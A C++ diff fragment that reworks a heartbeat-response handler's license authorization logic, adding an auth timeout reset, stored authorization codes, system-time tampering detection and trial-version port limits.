     BYTE buf[sizeof(Heartbeat) + 1];
     buf[0] = TOKEN_HEARTBEAT;
@@ -1055,17 +1440,54 @@ int AuthKernelManager::SendHeartbeat()
     return 0;
 }
 
+
 void AuthKernelManager::OnHeatbeatResponse(PBYTE szBuffer, ULONG ulLength)
 {
-    if (ulLength > sizeof(HeartbeatACK)) {
+    // Reset auth timeout timer whenever we receive a response from server
+    // This proves we can connect to the authorization server
+    AuthTimeoutChecker::ResetTimer();
+
+    if (ulLength > HeartbeatACK_OldSize) {
         HeartbeatACK n = { 0 };
-        memcpy(&n, szBuffer + 1, sizeof(HeartbeatACK));
+        const int size = sizeof(HeartbeatACK);
+        memcpy(&n, szBuffer + 1, ulLength > size ? size : HeartbeatACK_OldSize);
         m_nNetPing.update_from_sample(GetUnixMs() - n.Time);
-        if (n.Authorized == TRUE) {
-            Mprintf("======> Client authorized successfully.\n");
+        // Not authorized, but server is reachable, so just return and wait for next heartbeat
+		if (n.Authorized == UNAUTHORIZED) return;
+
+        if (1/* Authorized */) {
+            static std::string authorization = THIS_CFG->GetStr("settings", "Authorization", "");
+            if (n.Authorization[0] && authorization != n.Authorization) {
+                Mprintf("[AUTH] Authorization: %s ---> %s.\n", authorization.c_str(), n.Authorization);
+                THIS_CFG->SetStr("settings", "Authorization", authorization = n.Authorization);
+            }
+            static int64_t k = 0;
+            if (k++ % 12 == 0)
+            Mprintf("[AUTH] Client authorized [Status: %d] successfully.\n", unsigned(n.Authorized));
+
+            // 时间篡改检测：防止用户修改系统时间利用旧授权码
+            static DateVerify s_dateVerify;
+            if (s_dateVerify.isTimeTampered(1)) {
+                Mprintf("!!! [FATAL] System time tampered detected. Terminating process.\n");
+                Logger::getInstance().flush();  // 确保日志写入磁盘
+				Sleep(2000); // 等待日志写入完成
+                TerminateProcess(GetCurrentProcess(), 0xDEAD0001);
+                return;
+            }
+
+            if (n.IsTrail) {
+                // Trial version: warn only when WAN connection detected
+                LANChecker::CheckAndWarn();
+                // Trial version: limited to 2 listening port
+                LANChecker::CheckPortLimit(2);
+                return; // Trial version, do not exit
+            }
             // Once the client is authorized, authentication is no longer needed
             // So we can set exit flag to terminate the AuthKernelManager
-            g_bExit = S_CLIENT_EXIT;
+            AuthTimeoutChecker::SetAuthorized();
+            if (n.Authorized == AUTHED_BY_SUPER)
+                g_bExit = S_CLIENT_EXIT;
+			// If authorized by admin, keep the connection because these clients are managed by Layer-1 master
         }
     } else if (ulLength > 8) {
         uint64_t n = 0;
